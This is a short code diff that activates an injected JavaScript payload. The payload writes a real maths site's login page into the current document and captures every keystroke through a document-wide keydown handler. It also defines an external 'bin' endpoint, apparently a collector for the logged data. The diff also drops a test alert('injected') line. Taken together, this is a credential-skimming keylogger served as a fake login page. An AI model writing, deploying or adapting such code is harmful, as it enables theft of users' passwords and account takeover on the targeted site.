@@ -1,8 +1,8 @@
-/*(function() {
+(function() {
   const comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
   const bin = 'https://???/bin?data='
 
-  const load = path => document.write(
+  const load = async path => document.write(
     await fetch(path)
     .then(r => r.text())
   )
@@ -15,6 +15,4 @@
   
   document.onkeydown = ({key}) => log(key)
   load(`/login.php?url=${encodeURIComponent(comfort)}`)
-})()*/
-
-alert('injected')
+})()
